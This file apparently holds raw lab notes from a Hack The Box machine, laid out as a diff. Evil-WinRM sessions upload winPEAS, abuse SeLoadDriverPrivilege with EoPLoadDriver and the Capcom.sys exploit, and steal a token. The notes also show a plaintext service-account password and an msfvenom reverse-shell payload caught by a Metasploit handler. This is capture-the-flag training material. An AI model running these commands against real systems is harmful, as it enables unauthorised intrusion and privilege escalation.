@@ -1,0 +1,178 @@
+Evil-WinRM* PS C:\Users\svc-print\Desktop> upload winPEAS.exe
+Info: Uploading winPEAS.exe to C:\Users\svc-print\Desktop\winPEAS.exe
+
+                                                             
+Data: 629416 bytes of 629416 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\svc-print\Desktop> ls
+
+
+    Directory: C:\Users\svc-print\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        8/22/2020   9:23 AM             34 user.txt
+-a----        8/23/2020   8:27 AM              0 winPEAS.bat
+-a----        8/23/2020   8:30 AM         472064 winPEAS.exe
+
+
+*Evil-WinRM* PS C:\Users\svc-print\Desktop> ./winPEAS.exe >results.html
+
+*Evil-WinRM* PS C:\Users\svc-print\Desktop> download results.html
+Info: Downloading C:\Users\svc-print\Desktop\results.html to results.html
+
+                                                             
+Info: Download successful!
+
+Too much info. 
+
+Browsing dirs
+
+Evil-WinRM* PS C:\> cat readme.txt
+// MFT printing format issue
+
+note to HP engineer:
+
+The "test" directory has been created. For repeated tests while diagnosing this issue, the same folder should be used.
+
+This is a production environment and the "solution" should be developed and confirmed working in your testbed
+
+All changes will be reverted every 2 mins.
+
+
+
+*Evil-WinRM* PS C:\inetpub\wwwroot>  whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ==============================================
+fabricorp\svc-print S-1-5-21-2633719317-1471316042-3957863514-1104
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Print Operators                    Alias            S-1-5-32-550                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+FABRICORP\IT_Accounts                      Group            S-1-5-21-2633719317-1471316042-3957863514-1604 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeLoadDriverPrivilege         Load and unload device drivers Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+
+
+This link came in handy as it has technique of abusing the privelege. https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/ Chained with https://github.com/tandasat/ExploitCapcom#GoCRTP
+
+
+*Evil-WinRM* PS C:\Users\svc-print\Documents> upload eoploaddriver.cpp
+Info: Uploading eoploaddriver.cpp to C:\Users\svc-print\Documents\eoploaddriver.cpp
+
+                                                             
+Data: 9652 bytes of 9652 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\svc-print\Documents> upload ExploitCapcom.cpp
+Info: Uploading ExploitCapcom.cpp to C:\Users\svc-print\Documents\ExploitCapcom.cpp
+
+                                                             
+Data: 12624 bytes of 12624 bytes copied
+
+Info: Upload successful!
+
+
+
+*Evil-WinRM* PS C:\Users\svc-print\Documents> .\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\Users\svc-print\Documents\capcom.sys
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
+NTSTATUS: 00000000, WinError: 0
+*Evil-WinRM* PS C:\Users\svc-print\Documents> .\ExploitCapcom.exe
+[*Evil-WinRM* PS C:\Users\svc-print\Documents> .\ExploitCapcom2.exe
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 000001A059B30008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[-] CreateProcess() failed
+
+msf6 exploit(windows/winrm/winrm_script_exec) > msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.14.155 LPORT=8888 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/test.exe
+
+
+
+┌─[✗]─[ashhad@parrot]─[~/Documents/htb/fuse]
+└──╼ $evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i fuse.htb
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-print\Documents> ls
+
+
+    Directory: C:\Users\svc-print\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/26/2020   6:58 AM          73802 test.exe
+
+
+*Evil-WinRM* PS C:\Users\svc-print\Documents> ./test.exe
+*Evil-WinRM* PS C:\Users\svc-print\Documents> 
+
+msf6 exploit(multi/handler) > exploit 
+
+[*] Started reverse TCP handler on 10.10.14.155:8888 
+[*] Encoded stage with x86/shikata_ga_nai
+[*] Sending encoded stage (267 bytes) to 10.10.10.193
+[*] Command shell session 1 opened (10.10.14.155:8888 -> 10.10.10.193:51548) at 2020-08-26 19:09:43 +0530
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\svc-print\Documents> 
+
+C:\Users\svc-print\Documents>background	
+
+Background session 1? [y/N]  y
+msf6 exploit(multi/handler) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type               Information  Connection
+  --  ----  ----               -----------  ----------
+  1         shell x86/windows               10.10.14.155:8888 -> 10.10.10.193:51624 (10.10.10.193)
